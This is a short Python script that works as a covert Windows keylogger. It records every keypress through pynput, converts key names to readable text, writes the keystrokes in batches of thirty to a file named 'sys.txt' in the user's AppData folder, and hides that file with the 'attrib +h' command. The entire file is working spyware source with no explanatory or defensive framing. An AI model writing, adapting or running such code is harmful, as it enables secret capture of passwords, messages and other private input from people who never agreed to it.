from pynput.keyboard import Listener
import re, os

fileLog = os.environ['appdata']+'\\sys.txt'

buffer=[]
def keyboard(k):
    global buffer

    k = str(k)
    k = re.sub(r'\'', '', k)
    k = re.sub('Key.delete', ' DELETE ', k)
    k = re.sub('Key.space', ' ', k)
    k = re.sub('Key.esc', '', k)
    k = re.sub('Key.alt', '', k)
    k = re.sub('Key.ctrl', '', k)
    k = re.sub('Key.shift', '', k)
    k = re.sub('Key.enter', ' ENTER ', k)
    k = re.sub('Key.backspace', ' ', k)
    k = re.sub('Key.up', ' UP ', k)
    k = re.sub('Key.down', ' DOWN ', k)
    k = re.sub('Key.left', ' LEFT ', k)
    k = re.sub('Key.right', ' RIGHT ', k)
    k = re.sub('Key.tab', ' TAB ', k)
    k = re.sub('Key.caps_lock', ' CAPSLOCK ', k)
    k = re.sub('Key.cmd', ' WINBUTTON ', k)
    k = re.sub('Key.f1', ' F1 ', k)
    k = re.sub('Key.f2', ' F2 ', k)
    k = re.sub('Key.f3', ' F3 ', k)
    k = re.sub('Key.f4', ' F4 ', k)
    k = re.sub('Key.f5', ' F5 ', k)
    k = re.sub('Key.f6', ' F6 ', k)
    k = re.sub('Key.f7', ' F7 ', k)
    k = re.sub('Key.f8', ' F8 ', k)
    k = re.sub('Key.f9', ' F9 ', k)
    k = re.sub('Key.f10', ' F10 ', k)
    k = re.sub('Key.f11', ' F11 ', k)
    k = re.sub('Key.f12', ' F12 ', k)
    k = re.sub('<96>', '0', k)
    k = re.sub('<97>', '1', k)
    k = re.sub('<98>', '2', k)
    k = re.sub('<99>', '3', k)
    k = re.sub('<100>', '4', k)
    k = re.sub('<101>', '5', k)
    k = re.sub('<102>', '6', k)
    k = re.sub('<103>', '7', k)
    k = re.sub('<104>', '8', k)
    k = re.sub('<105>', '9', k)

    buffer.append(k)

    if len(buffer)>=30:
        with open(fileLog, 'a') as l:
            l.write(''.join(buffer))
        os.system(f'attrib +h {fileLog}')
        buffer=[]

with Listener(on_press=keyboard) as l:
    l.join()


